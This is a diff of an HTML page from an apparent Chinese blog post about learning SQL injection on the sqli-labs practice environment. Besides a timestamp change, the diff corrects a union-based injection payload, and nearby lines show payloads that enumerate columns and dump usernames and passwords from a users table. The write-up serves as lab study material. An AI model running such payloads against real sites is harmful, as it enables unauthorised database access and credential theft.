@@ -106,7 +106,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/sqllab4.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/sqllab5.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/sqllab6.PNG">
-<meta property="og:updated_time" content="2018-03-07T08:54:34.095Z">
+<meta property="og:updated_time" content="2018-03-09T06:28:19.873Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs学习">
 <meta name="twitter:description" content="借助sqli-labs 系统学习下注入">
@@ -384,7 +384,7 @@
 <p>除了用group_concat函数，还可以使用LIMIT来遍历出有哪些表，期间只需要改变limit中第一个参数的值使其从0开始逐渐递增即可</p>
 <p>我们可以发现一共有四张表 其中user表根据经验是最重要的</p>
 <p>所以我们对它进行列名的查询</p>
-<p>?id=-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_scheam=’’ and table_name=’’%23</p>
+<p>?id=-1’union select 1,2,group_concat(column_name) from information_schema.COLUMNS where table_schema=database() and TABLE_NAME=’’%23</p>
 <p>(遇到过一个题用table_scheam=就一直不行 但是直接还用table_name=’xxx’就爆出来了)</p>
 <p>发现这张表有三列 id username password</p>
 <p>id=-1’ union select 1,2,group_concat(concat_ws(char(32,58,32),id,username,password)) from users %23  </p>
